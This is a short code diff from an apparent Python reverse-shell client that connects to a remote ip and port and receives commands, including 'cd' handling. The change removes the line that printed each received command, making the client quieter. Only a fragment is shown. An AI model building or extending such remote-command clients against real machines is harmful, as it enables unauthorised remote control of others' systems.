@@ -11,7 +11,6 @@ c.connect((ip, port))
 
 while 1:
     msg = c.recv(1024).decode('ascii')
-    print(msg)
     if str(msg).startswith('cd'):
         try:
             d = str(msg).replace('cd ', '')
